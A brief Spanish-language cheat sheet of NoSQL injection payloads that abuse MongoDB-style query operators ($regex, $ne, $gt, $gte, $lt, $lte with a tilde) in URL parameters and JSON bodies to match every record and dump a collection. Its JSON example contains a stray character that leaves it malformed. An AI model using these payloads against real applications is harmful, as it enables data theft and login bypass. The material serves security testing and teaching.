## INFO

Podemos aprovechar los operadores para forzar una exfiltración de toda la data de una colección:

### Regex:

        variable[$regex]=.*

### No-Match

        variable[$ne]=noexistente

### Length

En este caso los terminos a buscar van en blanco.

Buscar todos los documentos que sean mayores que

        variable[$gt]=

Buscar todos los documentos que sean mayores o iguales a

        variable[$gte]=

### TILDA
Usamos la tilda para buscar todos los datos que sean menores a la misma (tilda es el valor imprimible más largo de los valores ASCII).

        variable[$lt]=~

Misma lógica con menor o igual:

        variable[$lte]=~


## En objetos JSON:

Podemos introducir estas queryes en objetos JSON dentro del value encerrado en llaves:

{
        "username": { "$ne" : "x"p}

}
